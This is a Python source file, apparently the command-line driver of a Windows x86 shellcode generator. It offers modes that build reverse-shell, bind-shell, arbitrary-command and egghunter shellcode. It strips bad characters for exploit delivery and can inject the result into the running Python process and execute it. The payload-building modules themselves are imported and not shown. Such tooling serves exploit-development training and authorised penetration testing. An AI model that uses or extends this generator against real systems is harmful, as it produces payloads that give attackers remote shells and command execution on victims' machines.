import argparse
from ast import literal_eval

import runner
import stones
from coder import bind_shell, egghunter, exec_command, reverse_shell

EXIT_FUNCTIONS = {
    "process": ("KERNEL32.DLL", "TerminateProcess"),
    "thread": ("ntdll.dll", "RtlExitUserThread"),
    "none": None,
}


def parse_args():
    def setup_parser():
        parser = argparse.ArgumentParser(description="Windows x86 Shellcode Generator")
        parser.add_argument(
            "-b",
            "--badchars",
            required=False,
            help="Characters to avoid",
        )
        parser.add_argument(
            "-r",
            "--run_shellcode",
            action="store_true",
            required=False,
            help="Inject shellcode into a current Python process",
        )
        parser.add_argument(
            "-w",
            "--use_windbg",
            action="store_true",
            required=False,
            help="Insert int3 for debugger into shellcode",
        )
        parser.add_argument(
            "-e",
            "--exit_func",
            required=False,
            choices=list(EXIT_FUNCTIONS.keys()),
            default="process",
            help="Function called to terminate shellcode",
        )
        return parser

    def setup_reverse_parser(subparsers):
        reverse_parser = subparsers.add_parser(
            "reverse", help="Generate reverse shell shellcode"
        )
        reverse_parser.add_argument(
            "-i",
            "--lhost",
            required=True,
            help="Local hostname",
        )
        reverse_parser.add_argument(
            "-p",
            "--lport",
            required=True,
            help="Local port",
        )
        return reverse_parser

    def setup_bind_parser(subparsers):
        bind_parser = subparsers.add_parser(
            "bind", help="Generate bind shell shellcode"
        )
        bind_parser.add_argument(
            "-p",
            "--rport",
            required=True,
            help="Remote port",
        )
        return bind_parser

    def setup_exec_parser(subparsers):
        exec_parser = subparsers.add_parser(
            "exec", help="Generate execute command shellcode"
        )
        exec_parser.add_argument(
            "-c",
            "--command",
            required=True,
            help="Command Line",
        )
        return exec_parser

    def setup_egghunter_parser(subparsers):
        egghunter_parser = subparsers.add_parser(
            "egghunter", help="Generate egghunter shellcode"
        )
        egghunter_parser.add_argument(
            "egghunter_type",
            choices=["ntaccess", "seh"],
            help="Egghunter type",
        )
        egghunter_parser.add_argument(
            "-t",
            "--tag",
            required=True,
            help="Tag",
        )
        return egghunter_parser

    def setup_loadfile_parser(subparsers):
        loadfile_parser = subparsers.add_parser(
            "loadfile", help="Load shellcode from file"
        )
        loadfile_parser.add_argument(
            "-f",
            "--file",
            required=True,
            help="File path to load",
        )
        return loadfile_parser

    parser = setup_parser()
    mode_subparsers = parser.add_subparsers(
        dest="mode", required=True, help="Shellcode mode"
    )

    setup_reverse_parser(mode_subparsers)
    setup_bind_parser(mode_subparsers)
    setup_exec_parser(mode_subparsers)
    setup_egghunter_parser(mode_subparsers)
    setup_loadfile_parser(mode_subparsers)

    return parser.parse_args()


def generate_asm_code(args, bad_chars):
    if args.mode == "reverse":
        code = reverse_shell.generate(
            args.lhost,
            args.lport,
            bad_chars=bad_chars,
            exit_func=EXIT_FUNCTIONS[args.exit_func],
            debug=args.use_windbg,
        )

    elif args.mode == "bind":
        code = bind_shell.generate(
            args.rport,
            bad_chars=bad_chars,
            exit_func=EXIT_FUNCTIONS[args.exit_func],
            debug=args.use_windbg,
        )

    elif args.mode == "exec":
        code = exec_command.generate(
            args.command,
            bad_chars=bad_chars,
            exit_func=EXIT_FUNCTIONS[args.exit_func],
            debug=args.use_windbg,
        )

    elif args.mode == "egghunter":
        if args.egghunter_type == "ntaccess":
            code = egghunter.generate_ntaccess(args.tag, debug=args.use_windbg)

        elif args.egghunter_type == "seh":
            code = egghunter.generate_seh(args.tag, debug=args.use_windbg)

    return code


def generate_shellcode(args, bad_chars):
    if args.mode == "loadfile":
        with open(args.file, "rb") as f:
            return f.read()

    code = generate_asm_code(args, bad_chars)
    replaced_code = stones.replace_instructions(code, bad_chars)
    return stones.assemble(replaced_code)


def main():
    args = parse_args()

    bad_chars = b"\x00"
    if args.badchars:
        bad_chars = literal_eval(f"b'{args.badchars}'")

    shellcode = generate_shellcode(args, bad_chars)
    print(f"# shellcode size: {hex(len(shellcode))} ({len(shellcode)})")
    print(f"shellcode = {bytes(shellcode)}")

    contains_bad_chars = any(c in bad_chars for c in shellcode)
    if contains_bad_chars:
        instructions = stones.disassemble(shellcode)
        asm = stones.find_bad_chars(instructions, bad_chars)
        print("\n# bad chars were found in the shellcode")
        print(asm)

    if args.run_shellcode:
        ptr = runner.load_shellcode(shellcode)
        print(f"\n# address of the injected shellcode: {hex(ptr)}")

        input("Press any key to execute the shellcode...")

        print("Executing the shellcode")
        runner.run_shellcode(ptr)

        print("Execution finished")


if __name__ == "__main__":
    main()
